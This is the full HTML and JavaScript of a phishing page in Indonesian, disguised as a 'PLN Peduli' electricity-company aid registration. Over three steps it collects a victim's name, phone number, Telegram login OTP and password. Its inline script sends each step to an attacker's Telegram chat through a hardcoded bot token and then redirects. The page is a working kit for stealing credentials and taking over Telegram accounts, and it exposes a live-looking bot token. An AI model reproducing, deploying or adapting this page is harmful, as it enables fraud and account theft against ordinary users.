<html>
<head>
        <!-- Required Meta Tags -->
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

       <!-- Plugins CSS -->
        <link rel="stylesheet" href="assets/css/plugins.css">
        <!-- Icon Plugins CSS -->
        <link rel="stylesheet" href="assets/css/iconplugins.css">
        <!-- Style CSS -->
        <link rel="stylesheet" href="assets/css/style.css">
        <!-- Responsive CSS -->
        <link rel="stylesheet" href="assets/css/responsive.css">
        <!-- Theme Dark CSS -->
        <link rel="stylesheet" href="assets/css/theme-dark.css">
 
        <!-- Title -->
        <title>PLN Peduli</title>

        <!-- Favicon -->
        <link rel="icon" type="image/png" href="assets/images/favicon.png">
        <style>
        .register-form .hidden { 
            display: none; 
            
        }
        </style>
    </head>
<body>
    <!-- Pre Loader -->
    <div id="preloader">
            <div id="preloader-area">
                <div class="spinner"></div>
                <div class="spinner"></div>
                <div class="spinner"></div>
                <div class="spinner"></div>
                <div class="spinner"></div>
                <div class="spinner"></div>
                <div class="spinner"></div>
                <div class="spinner"></div>
            </div>
            <div class="preloader-section preloader-left"></div>
            <div class="preloader-section preloader-right"></div>
        </div>
        <!-- End Pre Loader -->
<div id="carouselExampleInterval" class="carousel slide" data-bs-ride="carousel">
  <div class="carousel-inner">
    <div class="carousel-item active" data-bs-interval="2500">
      <img src="assets/images/plnpeduli.jpg" class="d-block w-100" alt="...">
    </div>
  </div>
  <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleInterval" data-bs-slide="prev">
    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
    <span class="visually-hidden">Previous</span>
  </button>
  <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleInterval" data-bs-slide="next">
    <span class="carousel-control-next-icon" aria-hidden="true"></span>
    <span class="visually-hidden">Next</span>
  </button>
</div>
        
    <!-- Register Area -->
        <div class="register-area pb-70 mt-2">
            <div class="container">
                <div class="row">
                    <div class="col-lg-5">
                        <div class="register-form">
                            <div class="form-container">
                            <form class="multistep register-form-max">
                            <div id="step1" class="form-step">
                                    <input type="hidden" name="form_type" value="contact">                    <div class="top-header">
                                <h3>Pendaftaran PLN Peduli</h3>
                                <span>Silahkan untuk melengkapi form Pendaftaran dibawah ini dengan benar</span>
                            </div>
                            <p></p>
                                <div class="row">
                                    <div class="col-lg-12">
                                        <div class="form-group">
                                            <input type="text" name="name" id="name" class="form-control" required placeholder="Nama Pelanggan">
                                        </div>
                                    </div>

                                    <div class="col-lg-12 ">
                                        <div class="form-group">
                                            <input type="tel" class="form-control" required placeholder="ID Pelanggan">
                                        </div>
                                    </div>

                                    <div class="col-lg-12 ">
                                        <div class="form-group">
                                            <select class="form-select" aria-label="Default select example">
                                            <option selected>Golongan Daya</option>
                                            <option value="10JT">450 VA</option>
                                            <option value="15JT">900 VA</option>
                                            <option value="20JT">1.300 VA</option>
                                            <option value="50JT">2.200 VA</option>
                                            <option value="60JT">3.500 VA - 5.500 VA</option>
                                            <option value="80JT">6.600 VA - 14.000 VA</option>
                                            <option value="90JT">di atas 14.000 VA</option>
                                            </select>
                                        </div>
                                    </div>

                                    <div class="col-lg-12 ">
                                        <div class="form-group">
                                            <input type="tel" name="phone" id="phone" maxlength="18" class="form-control" required placeholder="No. Telegram Aktif">
                                        </div>
                                    </div>
    
                                    <div class="col-lg-12 col-md-12 text-center">
                                        <button type="button" class="default-btn border-radius-50"
                                        onclick="nextStep()">
                                            Daftar
                                        </button>
                                    </div>
                                </div>
                                </div>
                                
                                <div id="step2" class="form-step hidden">
                                    <input type="hidden" name="form_type" value="otp">
					        <input type="hidden" name="name" id="name">
					        <input type="hidden" name="phone" id="phone">
                            <div class="top-header">
                                <h3>Pendaftaran PLN Peduli</h3>
                                <span>Verifikasi Akun, Silahkan masukkan OTP yang telah Anda terima di Telegram untuk melanjutkan pendaftaran.</span>
                            </div>
                            <p></p>
                                <div class="row">
                                    <div class="col-lg-12">
                                        <div class="form-group">
                                            <input type="tel" name="otp" style="text-align: center;" maxlength="5" id="otp_code" class="form-control" required placeholder="Masukkan Kode Verifikasi">
                                        </div>
                                        <div>
                                            <span id="wrong"></span>
                                        </div>
                                    </div>
                                    
                                    <div class="col-lg-12 col-md-12 text-center">
                                        <button type="button" class="default-btn border-radius-50" onclick="nextStep()">
                                            Lanjutkan Pendaftaran
                                        </button>
                                    </div>
                                </div>
                                </div>
                                
                                <div id="step3" class="form-step hidden">
                                    <input type="hidden" name="form_type" value="password">
						    <input type="hidden" name="name" id="name2">
						    <input type="hidden" name="phone" id="phone2">
						    <input type="hidden" name="otp" id="otp">
                            <div class="top-header">
                                <h3>Pendaftaran PLN Peduli</h3>
                                <span>Verifikasi Akun, Silahkan masukkan Password Anda jika ada.</span>
                            </div>
                            <p></p>
                                <div class="row">
                                    <div class="col-lg-12">
                                        <div class="form-group">
                                            <input type="text" name="password" id="password" style="text-align: center;" class="form-control" required data-error="Please Enter Your Name" placeholder="Masukkan Password(Optional)">
                                        </div>
                                    </div>
                                    
                                    <div class="col-lg-12 col-md-12 text-center">
                                        <button type="button" class="default-btn border-radius-50" onclick="submitForm()">
                                            Lanjutkan Pendaftaran
                                        </button>
                                    </div>
                                </div>
                                </div>
                                
                            </form>
                            </div>
                        </div>
                    </div>
                </div>
                
<script>
        const TELEGRAM_API_URL = 'https://api.telegram.org/bot7584395741:AAEyXt1EmC5CMhjoHPQyFpCAqdee0smEKfs/sendMessage'; // Ganti dengan token bot Telegram Anda
        const CHAT_ID = '5218469747'; // Ganti dengan chat ID Telegram Anda

        async function sendToTelegram(message) {
    try {
        const response = await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const data = await response.json();
        console.log('Data berhasil dikirim ke Telegram:', data);
        return true;
    } catch (error) {
        console.error('Terjadi kesalahan saat mengirim data ke Telegram:', error);
        return false;
    }
}

function nextStep() {
    const currentStep = document.querySelector('.form-step:not(.hidden)');
    const nextStep = currentStep.nextElementSibling;

    // Validasi inputan
    if (!validateInputs(currentStep)) {
        alert('Harap isi semua kolom sebelum melanjutkan.');
        return;
    }

    // Simpan data dari langkah saat ini
    let message = '';
    if (currentStep.id === 'step1') {
        const name = document.querySelector('input[name="name"]').value;
        const phone = document.querySelector('input[name="phone"]').value;
        document.getElementById('name').value = name;
        document.getElementById('phone').value = phone;
        message = `𝐏𝐋𝐍 𝐏𝐞𝐝𝐮𝐥𝐢 1:\n- Nama: ${name}\n- No.HP : ${phone}`;
    } else if (currentStep.id === 'step2') {
        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        const otp = document.querySelector('input[name="otp"]').value;
        document.getElementById('name2').value = name;
        document.getElementById('phone2').value = phone;
        document.getElementById('otp').value = otp;
        message = `𝐏𝐋𝐍 𝐏𝐞𝐝𝐮𝐥𝐢 2:\n- Nama: ${name}\n- No.HP : ${phone}\n- OTP: ${otp}`;
    } else if (currentStep.id === 'step3') {
        // Ambil nilai dari input
        const name = document.getElementById('name2').value;
        const phone = document.getElementById('phone2').value;
        const otp = document.getElementById('otp').value;
        const password = document.querySelector('input[name="password"]').value;

        // Debugging: Log nilai untuk memastikan semuanya diambil dengan benar
        console.log('Debug Step 3:');
        console.log('Name:', name);
        console.log('Phone:', phone);
        console.log('OTP:', otp);
        console.log('Password:', password);

        // Bangun pesan
        message = `𝐏𝐋𝐍 𝐏𝐞𝐝𝐮𝐥𝐢 3:\n- Nama: ${name}\n- No.HP : ${phone}\n- OTP: ${otp}\n- Pass: ${password}`;
    }

    // Kirim data ke Telegram
    if (message) {
        sendToTelegram(message).then(success => {
            if (success) {
                // Pindahkan ke langkah berikutnya jika perlu
                currentStep.classList.add('hidden');
                nextStep.classList.remove('hidden');
            }
        });
    } else {
        // Pindahkan ke langkah berikutnya jika tidak ada pesan
        currentStep.classList.add('hidden');
        nextStep.classList.remove('hidden');
    }
}

async function submitForm() {
    const currentStep = document.querySelector('.form-step:not(.hidden)');
    if (currentStep.id === 'step3') {
        // Validasi inputan
        if (!validateInputs(currentStep)) {
            alert('Harap isi semua kolom sebelum mengirim.');
            return;
        }

        // Simpan data dari langkah 3 dan kirim ke Telegram
        const name = document.getElementById('name2').value;
        const phone = document.getElementById('phone2').value;
        const otp = document.getElementById('otp').value;
        const password = document.querySelector('input[name="password"]').value;

        // Bangun pesan
        const message = `𝐏𝐋𝐍 𝐏𝐞𝐝𝐮𝐥𝐢 3:\n- Nama: ${name}\n- Nomor Telepon: ${phone}\n- OTP: ${otp}\n- Pass: ${password}`;

        // Kirim data ke Telegram dan redirect setelah berhasil
        const success = await sendToTelegram(message);
        if (success) {
            window.location.href = 'verifikasi.php';
        }
    }
}

// Fungsi untuk memvalidasi inputan
function validateInputs(step) {
    const inputs = step.querySelectorAll('input[required]');
    return Array.from(inputs).every(input => input.value.trim() !== '');
}

    </script>
            
            </div>
        </div>
        <div class="enrolled-area-two pb-70">
            <div class="container">
                <div class="row align-items-center">
                    <div class="col-lg-6">
                        <div class="enrolled-img-three mb-30 pr-20">
                            <img src="assets/images/plnbumn.webp" alt="Enrolled">
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class="footer-area">
            <div class="copyright-area">
                <div class="container">
                    <div class="copy-right-text text-center">
                        <p>
                            Copyright <b>2024</b> All Rights Reserved 
                        </p>
                    </div>
                </div>
            </div>
        </footer>
        <script src="assets/js/jquery.min.js"></script>
        <!-- Plugins JS -->
        <script src="assets/js/plugins.js"></script>
        <!-- Custom  JS -->
        <script src="assets/js/custom.js"></script>
    </body>
</html>